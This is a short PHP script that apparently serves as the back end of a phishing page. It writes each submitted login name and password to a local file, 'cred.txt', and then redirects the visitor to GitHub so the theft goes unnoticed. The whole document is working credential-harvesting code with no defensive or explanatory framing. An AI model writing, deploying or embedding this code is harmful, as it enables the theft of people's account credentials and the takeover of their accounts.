<?php

file_put_contents("cred.txt", "Account: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com');
exit();
